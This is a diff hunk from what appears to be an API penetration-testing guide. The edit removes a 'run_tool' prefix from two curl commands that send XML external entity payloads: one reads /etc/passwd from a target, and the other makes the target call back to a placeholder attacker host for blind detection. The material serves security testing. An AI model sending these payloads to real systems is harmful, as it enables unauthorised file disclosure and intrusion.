@@ -171,8 +171,8 @@ Change `Content-Type: application/json` to `Content-Type: application/xml` and s
 
 ```bash
 # Basic XXE test
-run_tool curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' http://target/api
+curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' http://target/api
 
 # Blind XXE detection
-run_tool curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % ext SYSTEM "http://attacker.example/canary">%ext;]><foo>test</foo>' http://target/api
+curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % ext SYSTEM "http://attacker.example/canary">%ext;]><foo>test</foo>' http://target/api
 ```
